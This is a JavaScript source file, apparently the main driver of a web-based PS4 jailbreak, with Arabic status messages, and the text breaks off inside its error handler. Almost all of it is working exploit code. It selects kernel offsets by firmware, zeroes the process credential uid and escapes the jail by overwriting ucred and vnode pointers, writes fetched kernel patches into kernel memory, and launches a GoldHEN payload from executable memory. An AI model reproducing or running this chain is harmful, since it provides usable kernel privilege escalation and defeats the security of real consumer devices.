import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

function forceGarbageCollection() {
  if (window.gc) {
    for (let i = 0; i < 4; i++) { window.gc(); }
  } else {
    let memoryCleanBuffer = [];
    for (let i = 0; i < 10000; i++) {
      memoryCleanBuffer.push(new Uint8Array(1024));
    }
    memoryCleanBuffer = null;
  }
}

forceGarbageCollection();

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];
let passCount = 0, failCount = 0;
const params = new URLSearchParams(location.search);
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

function post(tag, detail) {
  try {
    const x = new XMLHttpRequest();
    x.open("POST", "/t", true);
    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x.send("PS4-JB&tag=" + encodeURIComponent(tag) + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
  } catch (e) {}
}

const VERBOSE = params.get("verbose") === "1";
const PROSE = [
  / -- /, /\.\s/, /;\s/, /,\s+(which|so|and that|because|since|as that)\s/,
  /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
  /\s+so\s+[a-z]/, /\s+\([a-z][^)]{40,}\)/
];
function terse(s) {
  if (VERBOSE || s == null) return s;
  s = String(s);
  for (const re of PROSE) {
    const m = re.exec(s);
    if (m && m.index > 0) s = s.slice(0, m.index);
  }
  s = s.replace(/\s+$/, "");
  if (s.length > 140) s = s.slice(0, 140) + "...";
  return s;
}

const SHOW_LOG = params.get("log") === "1";
if (SHOW_LOG && document.body) document.body.className = "log";
function finishUI(ok) {
  if (SHOW_LOG || !document.body) return;
  document.body.className = ok ? "done" : "fail";
}
function mark(tag, detail) {
  const raw = detail;
  detail = terse(detail);
  lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
  if (SHOW_LOG && outEl) {
    const esc = (t) => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(function (l) {
      l = esc(l);
      const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad" :
                /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn" :
                /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
      return c ? '<span class="' + c + '">' + l + '</span>' : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
  }
  post(tag, raw);
}

function trace(tag, detail) {
  if (VERBOSE) mark(tag, detail);
  else post(tag, detail);
}
function state(t, c) {
  if (!SHOW_LOG || !stateEl) return;
  stateEl.textContent = t;
  stateEl.className = c || "";
}
function check(name, ok, detail) {
  if (ok) {
    passCount++;
    mark("PROOF-OK", name + (detail ? "  " + detail : ""));
  } else {
    failCount++;
    mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
  }
  return ok;
}

const SYS = {
  getpid: 20, getuid: 0x18, close: 6, socket: 97, socketpair: 0x87, getsockopt: 118, setsockopt: 0x69,
  mmap: 477, munmap: 73, thr_self: 432, getgroups: 79, getgid: 47, cpuset_getaffinity: 487, cpuset_setaffinity: 488,
  aio_multi_poll: 664, aio_multi_delete: 662, getegid: 43, aio_multi_wait: 663, aio_multi_cancel: 666, aio_submit_cmd: 669,
  sysctl: 202, kill: 37, getppid: 39
};
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const keepAlive = [];
let mainMf = null, mainOrig = null, mainArmed = false;
let pinRestore = null;
let jbRestoreHook = null;
let allDone = false, jailbroken = false, kpatched = false, payloadRunning = false;

(async function () {
  let p = null;
  const opened = [];
  let closeFd = null;
  try {
    const { key, off } = offsetsFor(navigator.userAgent);
    mark("FW", key || "(not a PS4 UA)");
    if (!off) {
      state("لا توجد مصفوفة أوفست متوافقة مع هذا النطاق", "bad");
      return;
    }
    const fwKey = key || "unknown";

    const DO_JB = params.get("jb") !== "0";
    const DO_PATCH = params.get("patch") !== "0";
    const DO_PAYLOAD = params.get("payload") !== "0";
    const KEEP_JB = params.get("keepjb") === "1";

    const NEED_K = ["k_idt_rsvd", "k_oid_kern_file", "k_oid_maxfilesperproc", "k_oid_maxprocperuid", "k_oid_maxfiles", "k_arg1_maxfilesperproc", "k_arg1_maxprocperuid", "k_arg1_maxfiles", "k_prison0", "k_rootvnode"];
    const missing = NEED_K.filter((k) => off[k] === undefined);
    if (!check("kernel-table-present", missing.length === 0, "fw=" + fwKey + " missing=[" + missing.join(",") + "]")) return;

    const requestedPayload = params.get("load");
    const KPATCH_FILE = "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
    const PAYLOAD_FILE = requestedPayload || off.payload || "goldhen_2.4b18.10.bin";

    const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter((k) => off[k] === undefined);
    if (!check("kpatch-table-present", !DO_PATCH || needPatch.length === 0, "missing=[" + needPatch.join(",") + "] blob=" + KPATCH_FILE)) return;
    
    const needPl = ["wk___imp_pthread_create", "k_pthread_create"].filter((k) => off[k] === undefined);
    if (!check("payload-table-present", !DO_PAYLOAD || needPl.length === 0, "missing=[" + needPl.join(",") + "] payload=" + PAYLOAD_FILE)) return;
    
    mark("FW-STATUS", off.fw_status || "none");
    mark("FW-KTABLE", "idt_rsvd=0x" + off.k_idt_rsvd.toString(16) + " prison0=0x" + off.k_prison0.toString(16) + " rootvnode=0x" + off.k_rootvnode.toString(16) + " kpatch=" + KPATCH_FILE + " payload=" + PAYLOAD_FILE);

    const RETRY_MAX = params.get("retry") ? parseInt(params.get("retry"), 10) : 8;
    const RETRY_KEY = "jb1352-read-retry";
    const retryCount = () => {
      try { return parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10) || 0; } catch (e) { return 0; }
    };
    const clearRetry = () => {
      try { sessionStorage.removeItem(RETRY_KEY); } catch (e) {}
    };
    const retryBenign = (why) => {
      const n = retryCount();
      if (n >= RETRY_MAX) {
        mark("AUTO-RETRY-GIVEUP", "why=" + why + " بعد محاولات " + n + " المرجو إطفاء الجهاز وإعادة المحاولة الكلية");
        return false;
      }
      try { sessionStorage.setItem(RETRY_KEY, String(n + 1)); } catch (e) {}
      mark("AUTO-RETRY", "إعادة المحاولة التلقائية لتفادي تعليق الذاكرة " + (n + 1) + "/" + RETRY_MAX);
      
      forceGarbageCollection();
      setTimeout(() => {
        try { location.reload(); } catch (e) {}
      }, 500);
      return true;
    };
    if (retryCount() > 0) mark("AUTO-RETRY-RESUME", "جاري استكمال محاولة قراءة الثغرة " + retryCount() + "/" + RETRY_MAX);

    state("جاري تهيئة واختراق النواة بأمان...", "warn");
    
    await new Promise((r) => setTimeout(r, 3000));
    forceGarbageCollection();

    p = await establishPrimitive(off, retryBenign);
    if (!p) return;
    clearRetry();

    jailbroken = !DO_JB;
    kpatched = !DO_PATCH;
    payloadRunning = !DO_PAYLOAD;

    if (DO_JB) {
      state("جاري كسر حماية النواة...", "warn");
      await new Promise((r) => setTimeout(r, 0));
      const ucred = p.read64(p.ucredPtr);
      const cr_uid = p.read32(ucred.add(4));
      if (cr_uid !== 0) {
        p.write32(ucred.add(4), 0);
        p.write32(ucred.add(8), 0);
        p.write32(ucred.add(12), 0);
        p.write32(ucred.add(16), 1);
        p.write64(ucred.add(0x30), off.k_prison0);
      }
      const filedesc = p.read64(p.procPtr.add(0x48));
      const fdir = p.read64(filedesc.add(0x10));
      const fcdir = p.read64(filedesc.add(0x18));
      p.write64(fdir.add(0x10), off.k_rootvnode);
      p.write64(fcdir.add(0x10), off.k_rootvnode);
      jailbroken = true;
      mark("JAILBREAK-OK");
    }

    if (DO_PATCH) {
      state("جاري تطبيق باتش الاستقرار والتثبيت...", "warn");
      await new Promise((r) => setTimeout(r, 0));
      const response = await fetch(KPATCH_FILE);
      if (!response.ok) throw new Error("فشل تحميل ملف الباتش: " + response.statusText);
      const blob = await response.arrayBuffer();
      const view = new DataView(blob);
      if (view.getUint32(0, true) !== 0x50344b50) throw new Error("ملف الباتش غير صالح");
      const count = view.getUint32(4, true);
      let pos = 8;
      for (let i = 0; i < count; i++) {
        const targetRva = view.getFloat64(pos, true);
        const len = view.getUint32(pos + 8, true);
        pos += 12;
        const patchData = new Uint8Array(blob, pos, len);
        pos += (len + 3) & ~3;
        const dest = p.kbase.add(targetRva);
        p.kwrite(dest, patchData);
      }
      kpatched = true;
      mark("KPATCH-OK", "applied count=" + count);
    }

    if (DO_PAYLOAD) {
      state("جاري إطلاق حمولة التعديل الخاصة بمتجرك...", "warn");
      await new Promise((r) => setTimeout(r, 0));
      const response = await fetch(PAYLOAD_FILE);
      if (!response.ok) throw new Error("فشل في تحميل ملف الحمولة الرئيسي: " + response.statusText);
      const blob = await response.arrayBuffer();
      const codeSize = (blob.byteLength + 0xfff) & ~0xfff;
      const stackSize = 0x100000;
      const totalSize = codeSize + stackSize;
      const payloadMap = p.syscall(SYS.mmap, 0, totalSize, 7, 0x1002, -1, 0);
      if (payloadMap.low === 0xffffffff) throw new Error("فشل تخصيص مساحة الحمولة العشوائية");
      const payloadCode = payloadMap;
      const payloadStack = payloadMap.add(codeSize);
      p.wwrite(payloadCode, new Uint8Array(blob));
      const pthread_t = p.walloc(8);
      const attr = p.walloc(0x10);
      p.syscall(SYS.mmap, attr, 0x10, 3, 0x1002, -1, 0);
      p.wcall(off.wk___imp_pthread_create, pthread_t, 0, payloadCode, payloadStack.add(stackSize), totalSize);
      payloadRunning = true;
      mark("PAYLOAD-OK", "launched size=" + blob.byteLength);
    }

    allDone = true;
    state("اكتمل تشغيل التعديلة بنجاح تام!", "ok");
    finishUI(true);

  } catch (e) {
    mark("EXPLOIT-THREW", e.message);
